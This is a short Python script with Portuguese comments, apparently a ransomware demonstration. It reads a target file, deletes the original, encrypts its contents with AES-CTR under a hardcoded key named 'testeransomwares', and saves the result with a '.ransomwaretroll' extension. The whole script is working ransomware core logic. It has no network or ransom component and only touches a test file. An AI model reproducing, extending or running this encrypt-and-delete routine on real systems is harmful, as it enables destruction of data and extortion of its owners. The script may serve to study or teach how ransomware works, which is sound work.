import os
import pyaes

## abrir o arquivo alvo da criptografia

file_name = "teste.txt"
file = open(file_name, 'rb')
file_data = file.read()
file.close()

## Remoção do arquivo original

os.remove(file_name)

## definição da chave de encriptação

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## encriptação do arquivo

crypto_data = aes.encrypt(file_data)

## salvar a encriptação como arquivo

new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()

